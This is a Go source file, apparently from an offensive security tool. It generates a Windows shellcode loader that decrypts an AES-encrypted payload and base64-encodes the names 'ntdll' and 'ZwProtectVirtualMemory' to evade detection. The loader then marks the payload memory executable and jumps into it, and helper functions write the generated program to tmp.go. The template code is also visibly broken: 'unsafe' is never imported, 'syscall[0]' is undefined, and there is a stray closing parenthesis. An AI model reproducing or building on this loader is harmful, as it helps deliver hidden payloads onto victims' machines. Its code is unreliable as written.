package loader

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
)


func LoadWindowsTemplate(s Shellcode) string {
    return fmt.Sprintf(`
    package main

    import (
        "os"
        "syscall"
        "encoding/base64"

        "github.com/cmepw/loader"
    )

    func main() {
        /* decrypt shellcode using AES */
        payload, err := loader.DecryptPayload(%s, %s); if err != nil {
            os.Exit(1)
        }

        ntdll, _ := base64.StdEncoding.DecodeString("bnRkbGw=")
        zwprotectMemory, _ := base64.StdEncoding.DecodeString("WndQcm90ZWN0VmlydHVhbE1lbW9yeQ==")

        var hProcess uintptr = 0
        var pBaseAddr = uintptr(unsafe.Pointer(&payload[0]))
        var dwBufferLen = uint(len(payload))
        var dwOldPerm uint32

        /* prepare syscall in memory */
        syscall.NewLazyDLL(ntdll).NewProc(zwprotectMemory).call(
            hProcess - 1,
            uintptr(unsafe.Pointer(&pBaseAddr)),
            uintptr(unsafe.Pointer(&dwBufferLen)),
            0x20, /* PAGE_EXEC_READ */
            uintptr(unsafe.Pointer(&dwOldPerm)),
        )

        /* run syscall */
        syscall.Syscall(
            uintptr(unsafe.Pointer(&syscall[0])),
            0, 0, 0, 0,
        )
    })`, s.AesKey, s.Payload)
}

func ReadFile(filepath string) ([]byte, error) {

    buf := bytes.NewBuffer(nil)
    f, err := os.Open(filepath); if err != nil {
        return []byte{}, err
    }

    io.Copy(buf, f)
    f.Close()

    return buf.Bytes(), nil
}

func WriteToTempfile(payload string) error {
     // create file
    f, err := os.Create("tmp.go")
    if err != nil {
        log.Fatal(err)
    }
    defer f.Close()

    buffer := bufio.NewWriter(f)
    _, err = buffer.WriteString(payload + "\n"); if err != nil {
        log.Fatal(err)
    }

    // flush buffered data to the file
    if err := buffer.Flush(); err != nil {
        log.Fatal(err)
    }
    return nil
}
